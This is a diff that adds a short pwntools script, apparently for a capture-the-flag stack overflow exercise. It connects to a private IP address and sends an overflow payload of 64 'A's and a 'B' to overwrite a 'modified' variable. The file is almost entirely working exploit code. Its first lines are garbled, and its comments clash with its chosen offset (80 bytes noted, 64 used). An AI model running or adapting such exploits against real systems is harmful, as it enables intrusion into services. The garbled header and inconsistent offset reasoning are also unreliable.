@@ -1,0 +1,33 @@
+Speical case only in nothing work
+
+nono findoffset.py   
+from pwn import *
+
+# Connection details
+host = '172.25.120.240'
+port = 80  # Replace with the actual port
+
+def solve():
+    try:
+        io = remote(host, port)
+        
+        # The minimum characters to hit the 'modified' variable 
+        # is usually the buffer size + 1. 
+        # Since [rbp-0x50] is 80, try 80 or 64 depending on padding.
+        offset = 64 
+        payload = b"A" * offset + b"B"
+        
+        io.sendline(payload)
+        response = io.recvall(timeout=2).decode()
+        
+        if "Try again" not in response:
+            print(f"Success! Offset was {offset}")
+            print(response)
+        else:
+            print("Failed. Try offset 80.")
+            
+        io.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+solve()
